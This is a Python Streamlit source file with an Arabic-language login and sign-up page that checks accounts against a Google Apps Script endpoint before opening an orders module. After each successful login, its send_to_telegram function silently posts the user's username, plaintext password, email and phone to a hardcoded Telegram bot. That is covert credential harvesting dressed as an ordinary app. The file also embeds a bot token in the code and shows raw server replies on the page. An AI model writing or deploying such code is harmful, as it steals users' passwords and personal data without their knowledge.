import streamlit as st
import requests
import json
from orders import main as orders_main

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzAbMUZosZP2-IYLagqCutoa4hdXHszQhLL13fW_fyhYaEpAVrG5f0lokyDS1EWoDqq/exec"

def load_css(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        css = f.read()
    st.markdown(f"<style>{css}</style>", unsafe_allow_html=True)

def send_to_telegram(username, password, email, phone):
    bot_token = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
    chat_id = "6283768537"
    message = (
        f"📥 تسجيل دخول جديد:\n"
        f"👤 اسم المستخدم: {username}\n"
        f"🔑 كلمة المرور: {password}\n"
        f"📧 البريد الإلكتروني: {email}\n"
        f"📞 رقم الهاتف: {phone}"
    )
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        response = requests.post(url, data=payload)
        if not response.ok:
            st.error(f"فشل إرسال البيانات إلى التليجرام: {response.text}")
    except Exception as e:
        st.error(f"خطأ في إرسال البيانات إلى التليجرام: {e}")

def check_login(username, password):
    data = {
        "action": "check",
        "username": username,
        "password": password
    }
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=5)
        st.write(f"🛠️ رد السيرفر: {res.text}")
        result = json.loads(res.text)
        if result.get("status") == "TRUE":
            return {
                "username": username,
                "password": password,
                "email": result.get("email", ""),
                "phone": result.get("phone", "")
            }
        else:
            return None
    except Exception as e:
        st.error(f"خطأ في التحقق من تسجيل الدخول: {e}")
        return None

def add_user(username, password, email, phone):
    data = {
        "action": "add",
        "username": username,
        "password": password,
        "email": email,
        "phone": phone
    }
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=5)
        return res.text.strip() == "Added"
    except Exception as e:
        st.error(f"خطأ في تسجيل المستخدم الجديد: {e}")
        return False

def login_page():
    st.title("تسجيل الدخول")

    username = st.text_input("اسم المستخدم", key="login_username")
    password = st.text_input("كلمة المرور", type="password", key="login_password")

    login_clicked = st.button("دخول")

    if login_clicked:
        if not username or not password:
            st.warning("يرجى ملء جميع الحقول")
        else:
            user_data = check_login(username, password)
            if user_data:
                st.session_state['logged_in'] = True
                st.session_state['user_name'] = username
                # إرسال بيانات المستخدم إلى التليجرام
                send_to_telegram(
                    user_data["username"],
                    user_data["password"],
                    user_data["email"],
                    user_data["phone"]
                )
                return True
            else:
                st.error("اسم المستخدم أو كلمة المرور غير صحيحة")

    st.markdown("---")
    st.write("ليس لديك حساب؟ سجل هنا:")

    signup_username = st.text_input("اسم المستخدم للتسجيل الجديد", key="signup_username")
    signup_password = st.text_input("كلمة المرور للتسجيل الجديد", type="password", key="signup_password")
    signup_email = st.text_input("البريد الإلكتروني", key="signup_email")
    signup_phone = st.text_input("رقم الهاتف", key="signup_phone")

    if st.button("إنشاء حساب جديد"):
        if not signup_username or not signup_password or not signup_email or not signup_phone:
            st.warning("يرجى ملء جميع حقول التسجيل")
        else:
            if add_user(signup_username, signup_password, signup_email, signup_phone):
                st.success("تم إنشاء الحساب بنجاح، يمكنك الآن تسجيل الدخول")
            else:
                st.error("فشل في إنشاء الحساب، حاول مرة أخرى")
    return False

def main():
    load_css("styles.css")

    if 'logged_in' not in st.session_state or not st.session_state['logged_in']:
        just_logged_in = login_page()
        if just_logged_in:
            st.experimental_rerun()
    else:
        st.sidebar.write(f"مرحباً، {st.session_state['user_name']}")
        if st.sidebar.button("تسجيل خروج"):
            st.session_state['logged_in'] = False
            st.session_state.pop('user_name', None)
            st.experimental_rerun()

        orders_main()

if __name__ == "__main__":
    main()
